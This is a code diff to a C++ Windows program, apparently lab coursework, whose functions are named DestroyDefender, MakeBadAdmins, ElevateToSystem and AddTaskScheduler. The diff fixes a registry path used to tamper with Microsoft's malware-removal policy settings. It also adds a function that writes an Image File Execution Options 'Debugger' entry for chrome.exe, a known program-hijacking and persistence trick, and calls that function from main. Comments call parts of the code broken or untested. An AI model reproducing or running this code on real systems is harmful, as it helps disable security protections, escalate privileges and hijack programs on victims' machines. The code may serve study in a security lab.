@@ -317,7 +317,7 @@ std::string DestroyDefender() {
     }
     RegCloseKey(hkResult);
 
-    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWAR\\Policies\\Microsoft\\MRT", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
+    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\MRT", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
     if (retVal != ERROR_SUCCESS) {
         std::cout << "RegCreateKeyExA D failed with retVal: " << retVal << std::endl;
     }
@@ -497,6 +497,28 @@ std::string MakeBadAdmins() {
 }
 
 std::string AddImageFileExecutionOptionsKeys() {
+    DWORD one = 1;
+    DWORD zero = 0;
+    HKEY hkResult;
+    DWORD dwDisposition;
+    int retVal;
+
+    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chrome.exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegCreateKeyExA failed with retVal: " << retVal << std::endl;
+    }
+    if (dwDisposition == REG_CREATED_NEW_KEY) {
+        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
+    } else {
+        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe" -Name "Debugger" -Value 0
+    retVal = RegSetValueExA(hkResult, "Debugger", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA failed with retVal: " << retVal << std::endl;
+    }
+    RegCloseKey(hkResult);
+
     return "";
 }
 
@@ -532,13 +554,14 @@ std::string AddTaskScheduler() {
 
 // needs elevated run to privesc to system
 int main (int argc, char *argv[]) {
+    // setting the registry key values is broken, need to look into
     std::cout << "EnableDebugPrivs: " << lab6::EnableDebugPrivs() << std::endl;
     std::cout << "ElevateToSystem: " << lab6::ElevateToSystem() << std::endl;
     std::cout << "CheckCurrentUsername: " << lab6::CheckCurrentUsername() << std::endl;
     // need to test DestroyDefender on vm
     // std::cout << "DestroyDefender: " << lab6::DestroyDefender() << std::endl;
     // std::cout << "MakeBadAdmins: " << lab6::MakeBadAdmins() << std::endl;
-
+    std::cout << "AddImageFileExecutionOptionsKeys: " << lab6::AddImageFileExecutionOptionsKeys() << std::endl;
     int x;
     std::cin >> x;
     return 0;
